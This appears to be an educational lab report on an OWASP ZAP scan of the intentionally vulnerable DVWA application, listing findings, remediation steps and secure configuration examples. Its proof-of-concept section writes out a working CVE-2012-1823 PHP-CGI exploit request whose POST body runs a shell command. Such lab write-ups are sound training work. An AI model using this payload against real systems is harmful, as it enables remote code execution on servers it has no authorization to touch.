# OWASP ZAP Full Scan on DVWA - Lab Report
Project Overview
A comprehensive web application vulnerability assessment performed on the Damn Vulnerable Web Application (DVWA) using OWASP ZAP to identify security weaknesses and demonstrate penetration testing methodology.

# Lab Objectives
Perform automated vulnerability scanning using OWASP ZAP

Identify and categorize security vulnerabilities in a controlled environment

Document findings with appropriate risk ratings and remediation steps

Demonstrate ethical security testing methodology

# Environment Setup
Tools & Versions
OWASP ZAP: 2.13.0 (Standard Mode)

Target Application: DVWA v1.10

Container Runtime: Docker

Target URL: http://172.17.0.2/dvwa/index.php

Network Configuration
text
Target: 172.17.0.2 (DVWA Container)
Scanner: Host machine with ZAP proxy (localhost:8080)
# Methodology
1. Reconnaissance & Mapping
Added target to ZAP Sites tree

Manual browsing through ZAP proxy to map initial application structure

Configured scope and context for scanning

2. Automated Discovery
Spidering: Automated crawling to discover hidden paths and parameters

AJAX Spider: Enhanced discovery for modern web applications

3. Active Scanning
Launched full active scan against all discovered endpoints

Enabled all attack vectors and vulnerability types

Monitored scan progress and performance

4. Analysis & Reporting
Reviewed alerts sorted by risk level

Validated false positives

Documented exploitable vulnerabilities

# Key Findings Summary
 * High Risk Vulnerabilities
Vulnerability	Affected URL	Risk	Confidence	CVE Reference
Remote Code Execution	/dvwa/index.php	High	Medium	CVE-2012-1823
Source Code Disclosure	/dvwa/index.php	High	Medium	CVE-2012-1823
 * Medium Risk Findings
Issue	Impact	Recommendation Priority
Absence of Anti-CSRF Tokens	Session hijacking, unauthorized actions	High
Missing Security Headers	Clickjacking, MIME sniffing attacks	Medium
 * Low Risk & Informational
Finding	Details
Cookie Security	Missing HttpOnly, Secure, SameSite attributes
Server Information Disclosure	Version disclosure in HTTP headers
Hidden Files Discovered	Backup files, configuration files
   * Remediation Recommendations
Critical Actions Required
Patch PHP Installation

Update to latest PHP version

Disable dangerous PHP functions (system(), exec(), shell_exec())

Configure php.ini with secure settings

Implement Security Headers

http
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000
CSRF Protection

Add unique tokens to all forms

Implement same-origin policy validation

Use double-submit cookie pattern

Session Security

php
// Example secure cookie settings
session_set_cookie_params([
    'lifetime' => 0,
    'path' => '/',
    'domain' => '',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'
]);
Security Hardening Checklist
Remove unnecessary files from webroot

Disable directory listing

Implement WAF rules

Regular vulnerability scanning

Security header implementation

Input validation on all endpoints

# Scan Statistics
Total Alerts: 25+

High Risk Findings: 2

Medium Risk Findings: 5

Scan Duration: ~45 minutes

URLs Discovered: 50+

Parameters Tested: 200+

# Exploitation Proof of Concept
Remote Code Execution (CVE-2012-1823)
text
Vulnerable URL Pattern:
http://target/index.php?-s

Exploitation:
http://172.17.0.2/dvwa/index.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input

POST Data: <?php system('id'); ?>
Mitigation
apache
# Apache configuration
RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]
RewriteRule ^(.*) $1? [L]
* Lessons Learned
Automated scanners effectively identify common misconfigurations

Default installations often have critical security gaps

Security headers are frequently overlooked but provide essential protection

Regular scanning should be integrated into development lifecycle

False positives require manual validation for accurate assessment

* Responsible Disclosure
This assessment was performed on an intentionally vulnerable application (DVWA)

All testing was conducted in an isolated lab environment

No real systems or data were compromised

DVWA is designed for security education and training

# Start DVWA container
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# Install OWASP ZAP
# Download from: https://www.zaproxy.org/download/
Basic Scan Command
bash
# Using ZAP in daemon mode
zap.sh -cmd -quickurl http://target -quickout /path/to/report.html
* License
This documentation is for educational purposes only. Use these techniques only on systems you own or have explicit permission to test.

* Contributing
Found an issue or have improvements? Feel free to:

Open an Issue

Submit a Pull Request

Suggest additional test cases

Disclaimer: This security assessment was performed on a controlled, intentionally vulnerable application (DVWA) for educational purposes only. Always obtain proper authorization before testing any system.


